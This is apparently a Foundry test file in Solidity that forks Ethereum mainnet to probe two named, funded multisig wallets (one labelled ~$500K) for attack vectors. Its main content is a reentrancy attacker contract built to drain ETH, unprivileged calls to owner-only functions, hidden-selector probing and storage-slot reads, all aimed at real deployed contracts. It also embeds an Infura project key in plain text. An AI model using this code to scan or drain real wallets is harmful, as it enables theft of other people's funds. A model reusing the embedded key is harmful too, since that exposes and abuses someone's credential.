// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "forge-std/Test.sol";

/**
 * @title GnosisMultiSigAttack - Offensive security test for Gnosis MultiSigWallet
 * @notice Testing attack vectors specific to Solidity 0.4.24:
 *   1. Integer underflow in owners.length
 *   2. Reentrancy via call.value() before state update
 *   3. Configuration manipulation (required = 0)
 *   4. Confirmation replay after owner replacement
 *   5. Transaction execution race conditions
 */

interface IMultiSigWallet {
    function owners(uint256) external view returns (address);
    function required() external view returns (uint256);
    function transactionCount() external view returns (uint256);
    function transactions(uint256) external view returns (address destination, uint256 value, bytes memory data, bool executed);
    function confirmations(uint256, address) external view returns (bool);
    function isOwner(address) external view returns (bool);
    function getOwners() external view returns (address[] memory);
    function getConfirmationCount(uint256) external view returns (uint256);
    function getTransactionCount(bool, bool) external view returns (uint256);
    function isConfirmed(uint256) external view returns (bool);

    function addOwner(address owner) external;
    function removeOwner(address owner) external;
    function replaceOwner(address owner, address newOwner) external;
    function changeRequirement(uint256 _required) external;
    function submitTransaction(address destination, uint256 value, bytes calldata data) external returns (uint256);
    function confirmTransaction(uint256 transactionId) external;
    function revokeConfirmation(uint256 transactionId) external;
    function executeTransaction(uint256 transactionId) external;
}

// Reentrancy attacker contract
contract ReentrancyAttacker {
    IMultiSigWallet public target;
    uint256 public txId;
    uint256 public attackCount;
    uint256 public maxAttacks;

    constructor(address _target) {
        target = IMultiSigWallet(_target);
    }

    function setAttackParams(uint256 _txId, uint256 _maxAttacks) external {
        txId = _txId;
        maxAttacks = _maxAttacks;
        attackCount = 0;
    }

    receive() external payable {
        // Try to re-enter executeTransaction
        if (attackCount < maxAttacks) {
            attackCount++;
            try target.executeTransaction(txId) {
                // If this succeeds, we've drained more ETH
            } catch {}
        }
    }

    function withdraw() external {
        payable(msg.sender).transfer(address(this).balance);
    }
}

// Contract to test owner manipulation
contract OwnerManipulator {
    IMultiSigWallet public target;

    constructor(address _target) {
        target = IMultiSigWallet(_target);
    }

    function tryAddSelfAsOwner() external {
        try target.addOwner(address(this)) {} catch {}
    }

    function tryChangeRequirementToZero() external {
        try target.changeRequirement(0) {} catch {}
    }
}

contract GnosisMultiSigAttackTest is Test {
    // Known Gnosis MultiSig addresses with funds
    address constant MULTISIG_1 = 0x98b81a38cc8Ff51BD3862418188264e0b2A6f0C8; // OwnbitMultiSig ~$500K
    address constant MULTISIG_2 = 0xBEb28978B2c755155f20fd3d09Cb37e300A6981f; // Another MultiSig

    string MAINNET_RPC;
    uint256 mainnetFork;

    function setUp() public {
        MAINNET_RPC = "https://mainnet.infura.io/v3/bfc7283659224dd6b5124ebbc2b14e2c";
        mainnetFork = vm.createFork(MAINNET_RPC);
    }

    /**
     * ATTACK VECTOR 1: Reentrancy in executeTransaction
     *
     * In Solidity 0.4.24, the pattern is:
     *   txn.executed = true;
     *   if (txn.destination.call.value(txn.value)(txn.data))
     *       emit Execution(transactionId);
     *   else {
     *       txn.executed = false;  // RESET on failure!
     *   }
     *
     * Attack: If the call fails after draining funds via reentrancy,
     * txn.executed gets reset to false, allowing re-execution
     */
    function test_Attack_ReentrancyViaExecutedReset() public {
        vm.selectFork(mainnetFork);

        // Check if contract has ETH balance
        uint256 balance = address(MULTISIG_1).balance;
        console.log("MultiSig 1 ETH balance:", balance);

        if (balance == 0) {
            console.log("No ETH to drain, checking other multisigs...");
            return;
        }

        // Get owners
        IMultiSigWallet wallet = IMultiSigWallet(MULTISIG_1);

        try wallet.getOwners() returns (address[] memory owners) {
            console.log("Number of owners:", owners.length);
            for (uint i = 0; i < owners.length && i < 5; i++) {
                console.log("Owner", i, ":", owners[i]);
            }
        } catch {
            console.log("getOwners() failed - might not be standard Gnosis");
        }

        // The reentrancy attack would work if:
        // 1. We can become an owner (we can't as unprivileged)
        // 2. OR if executeTransaction is externally callable without owner check

        // Check if executeTransaction can be called by non-owner
        address attacker = address(0xBEEF);
        vm.startPrank(attacker);

        try wallet.executeTransaction(0) {
            console.log("CRITICAL: executeTransaction callable by non-owner!");
        } catch {
            console.log("executeTransaction blocked for non-owner (expected)");
        }

        vm.stopPrank();
    }

    /**
     * ATTACK VECTOR 2: Integer Underflow in removeOwner
     *
     * In 0.4.24 without SafeMath:
     *   owners.length -= 1;
     *
     * If there's a way to trigger this when length = 0,
     * it would underflow to 2^256-1
     */
    function test_Attack_OwnersArrayUnderflow() public {
        vm.selectFork(mainnetFork);

        IMultiSigWallet wallet = IMultiSigWallet(MULTISIG_1);

        // Check current owners count
        try wallet.getOwners() returns (address[] memory owners) {
            console.log("Current owners count:", owners.length);

            // The underflow would occur if:
            // 1. All owners are removed (but this requires owner permission)
            // 2. OR there's a storage manipulation

            // Check if contract has any storage collision vulnerability
            bytes32 ownersSlot = keccak256(abi.encodePacked(uint256(3))); // owners array slot
            bytes32 storedValue = vm.load(MULTISIG_1, ownersSlot);
            console.log("Owners array length from storage:");
            console.logBytes32(storedValue);

        } catch {
            console.log("Could not get owners");
        }
    }

    /**
     * ATTACK VECTOR 3: Configuration Bypass via changeRequirement
     *
     * If required can be set to 0, any single owner could execute
     * Or if there's an initialization issue
     */
    function test_Attack_RequirementManipulation() public {
        vm.selectFork(mainnetFork);

        IMultiSigWallet wallet = IMultiSigWallet(MULTISIG_1);

        uint256 required = wallet.required();
        console.log("Current required confirmations:", required);

        // Check if required is already 0 (misconfiguration)
        if (required == 0) {
            console.log("CRITICAL: required = 0! Any owner can execute!");
        }

        // Check if unprivileged can call changeRequirement
        address attacker = address(0xBEEF);
        vm.startPrank(attacker);

        try wallet.changeRequirement(0) {
            console.log("CRITICAL: changeRequirement callable by non-owner!");
        } catch {
            console.log("changeRequirement blocked for non-owner");
        }

        vm.stopPrank();
    }

    /**
     * ATTACK VECTOR 4: Confirmation Persistence After Owner Replacement
     *
     * When replaceOwner is called, old owner's confirmations might persist
     * in the confirmations mapping, potentially allowing new owner to
     * inherit confirmation power or causing counting issues
     */
    function test_Attack_ConfirmationPersistence() public {
        vm.selectFork(mainnetFork);

        IMultiSigWallet wallet = IMultiSigWallet(MULTISIG_1);

        // Get pending transactions
        try wallet.getTransactionCount(true, false) returns (uint256 pendingCount) {
            console.log("Pending transactions:", pendingCount);

            // Check each pending transaction for confirmation state
            uint256 totalTxCount = wallet.transactionCount();
            for (uint256 i = 0; i < totalTxCount && i < 10; i++) {
                (address dest, uint256 value, , bool executed) = wallet.transactions(i);
                if (!executed && value > 0) {
                    console.log("Pending tx", i, "destination:", dest);
                    console.log("Pending tx", i, "value:", value);

                    uint256 confirmCount = wallet.getConfirmationCount(i);
                    console.log("Confirmation count:", confirmCount);
                }
            }
        } catch {
            console.log("Could not get pending transactions");
        }
    }

    /**
     * ATTACK VECTOR 5: Direct External Call to Internal Functions
     *
     * In older Solidity, visibility modifiers might be missing
     * Check if internal functions are accidentally external
     */
    function test_Attack_VisibilityBypass() public {
        vm.selectFork(mainnetFork);

        // Try calling functions that should be internal
        address attacker = address(0xBEEF);
        vm.startPrank(attacker);

        // Try various internal function selectors that might exist
        // addTransaction, clearConfirmations, etc.

        bytes4[] memory selectors = new bytes4[](5);
        selectors[0] = bytes4(keccak256("addTransaction(address,uint256,bytes)"));
        selectors[1] = bytes4(keccak256("clearConfirmations(uint256)"));
        selectors[2] = bytes4(keccak256("setOwner(address)"));
        selectors[3] = bytes4(keccak256("setRequired(uint256)"));
        selectors[4] = bytes4(keccak256("_addOwner(address)"));

        for (uint i = 0; i < selectors.length; i++) {
            (bool success,) = MULTISIG_1.call(abi.encodeWithSelector(selectors[i]));
            if (success) {
                console.log("CRITICAL: Hidden function callable!");
                console.logBytes4(selectors[i]);
            }
        }

        vm.stopPrank();
    }

    /**
     * ATTACK VECTOR 6: Proxy Storage Collision
     *
     * If the MultiSig is behind a proxy, check for storage collisions
     * that might allow overwriting owner/required values
     */
    function test_Attack_ProxyStorageCollision() public {
        vm.selectFork(mainnetFork);

        // Check EIP-1967 admin slot
        bytes32 ADMIN_SLOT = 0xb53127684a568b3173ae13b9f8a6016e243e63b6e8ee1178d6a717850b5d6103;
        bytes32 IMPL_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;

        bytes32 admin = vm.load(MULTISIG_1, ADMIN_SLOT);
        bytes32 impl = vm.load(MULTISIG_1, IMPL_SLOT);

        console.log("EIP-1967 Admin slot:");
        console.logBytes32(admin);
        console.log("EIP-1967 Implementation slot:");
        console.logBytes32(impl);

        if (uint256(admin) != 0 || uint256(impl) != 0) {
            console.log("Contract is behind a proxy!");
            // Further analysis needed for proxy-specific attacks
        }

        // Check for owner at slot 0, 1, 2 (common patterns)
        for (uint256 i = 0; i < 5; i++) {
            bytes32 slotValue = vm.load(MULTISIG_1, bytes32(i));
            console.log("Slot", i);
            console.logBytes32(slotValue);
        }
    }

    /**
     * ATTACK VECTOR 7: Fallback Function Exploitation
     *
     * Check if fallback/receive accepts ETH without proper checks
     * or if there's a way to trigger unintended behavior
     */
    function test_Attack_FallbackExploitation() public {
        vm.selectFork(mainnetFork);

        address attacker = address(0xBEEF);
        vm.deal(attacker, 1 ether);
        vm.startPrank(attacker);

        // Try sending ETH directly
        (bool success,) = MULTISIG_1.call{value: 0.01 ether}("");
        console.log("Direct ETH send success:", success);

        // Try sending with data
        (success,) = MULTISIG_1.call{value: 0.01 ether}(hex"deadbeef");
        console.log("ETH send with data success:", success);

        vm.stopPrank();
    }

    /**
     * ATTACK VECTOR 8: Transaction ID Collision/Overflow
     *
     * transactionCount keeps incrementing. In 0.4.24, uint overflow at 2^256
     * Could create transaction ID collision if count wraps around
     */
    function test_Attack_TransactionIdOverflow() public {
        vm.selectFork(mainnetFork);

        IMultiSigWallet wallet = IMultiSigWallet(MULTISIG_1);

        uint256 txCount = wallet.transactionCount();
        console.log("Current transaction count:", txCount);

        // Overflow would require 2^256 transactions (impractical)
        // But check if there's a way to manipulate the count directly

        // Check if there's a function to set transactionCount
        bytes4 setCountSelector = bytes4(keccak256("setTransactionCount(uint256)"));
        (bool success,) = MULTISIG_1.call(abi.encodeWithSelector(setCountSelector, type(uint256).max));
        if (success) {
            console.log("CRITICAL: transactionCount can be set directly!");
        }
    }

    /**
     * Comprehensive scan of contract bytecode for vulnerabilities
     */
    function test_BytecodeAnalysis() public {
        vm.selectFork(mainnetFork);

        // Get contract bytecode
        bytes memory code = MULTISIG_1.code;
        console.log("Contract bytecode length:", code.length);

        // Check for DELEGATECALL (dangerous if target controlled)
        bool hasDelegatecall = false;
        for (uint i = 0; i < code.length - 1; i++) {
            if (code[i] == 0xf4) { // DELEGATECALL opcode
                hasDelegatecall = true;
                break;
            }
        }
        console.log("Has DELEGATECALL:", hasDelegatecall);

        // Check for SELFDESTRUCT
        bool hasSelfDestruct = false;
        for (uint i = 0; i < code.length; i++) {
            if (code[i] == 0xff) { // SELFDESTRUCT opcode
                hasSelfDestruct = true;
                break;
            }
        }
        console.log("Has SELFDESTRUCT:", hasSelfDestruct);
    }
}
